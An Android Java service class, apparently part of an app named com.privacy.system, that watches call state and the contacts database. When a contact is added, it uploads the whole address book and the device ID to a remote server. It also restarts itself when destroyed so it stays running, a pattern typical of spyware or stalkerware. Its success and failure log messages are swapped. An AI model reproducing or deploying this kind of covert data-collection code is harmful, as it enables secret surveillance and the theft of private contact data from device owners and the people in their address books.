package com.privacy.system.service;

import java.util.ArrayList;
import com.google.gson.Gson;
import com.privacy.system.base.C;
import com.privacy.system.db.ContactsDB;
import com.privacy.system.inte.RunBack;
import com.privacy.system.listener.MyPhoneStateListener;
import com.privacy.system.resolver.CallObserver;
import com.privacy.system.resolver.field.CallConstant;
import com.privacy.system.resolver.handler.CallHandler;
import com.privacy.system.service.utilservice.ClientSocket;
import com.privacy.system.service.utilservice.MonitorUtil;
import com.privacy.system.util.Logger;
import com.privacy.system.util.NetworkUtil;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

/**
 * 通话记录监听服务
 */
public class CallMonitoringService extends Service {

	private static final String TAG = CallMonitoringService.class.getSimpleName();
    private CallObserver callObserver;
    private Context context;
    private ContactsDB contactsDB;
    private SharedPreferences sp;
    
    @Override
    public IBinder onBind(Intent intent) {
            return null;
    }

    @Override
    public void onCreate() {
           Logger.d(TAG, "通话监听服务启动了");
           this.context = getApplicationContext();
           sp = this.context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
           contactsDB = ContactsDB.getInstance(this.context);
           ContentResolver callResolver = getContentResolver();
           callObserver = new CallObserver(callResolver,new CallHandler(getApplicationContext()),new MyRunnBack());
           callResolver.registerContentObserver(CallConstant.CONTRACTS_URI,true,callObserver);
           
           TelephonyManager mTelephonyManager = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
           mTelephonyManager.listen(new MyPhoneStateListener(this),PhoneStateListener.LISTEN_CALL_STATE);
    }
    
    

    @Override
    public void onDestroy() {
            Logger.d(TAG,"call服务销毁");
            Intent intent = new Intent(getApplicationContext(),CallMonitoringService.class);
            startService(intent);
            
            if(callObserver !=null){
            	getContentResolver().unregisterContentObserver(callObserver);
            }
            super.onDestroy();
    }
    
    private class MyRunnBack implements RunBack{
    	@Override
    	public void run() {
    		new Thread(new Runnable() {
				
				@Override
				public void run() {
					Logger.d("CallMonitoringService","通讯录新增联系人了....");
		    		ArrayList<ArrayList<String>> contracts = MonitorUtil.quertContacts(CallMonitoringService.this.context, contactsDB);
		    		if(contracts !=null && contracts.size()>2){
		    			String param = "key="+ClientSocket.APP_REQ_KEY+"&device_id="+sp.getString(C.DEVICE_ID,"")+"&book_list="+ new Gson().toJson(contracts);
						boolean result = NetworkUtil.uploadBook(context, param,C.RequestMethod.uploadContact);
						if(result){
							Logger.d("CallMonitoringService","上传通讯录失败");
							Editor editor = sp.edit();
							editor.putBoolean(C.CONTACTS_UPLOAD, false);
							editor.commit();
						}else {
							Logger.d("CallMonitoringService","上传通讯录成功");
						}
		    		}
				}
			}).start();
    	}

		@Override
		public void run(Object object) {
			
		}
    }
}
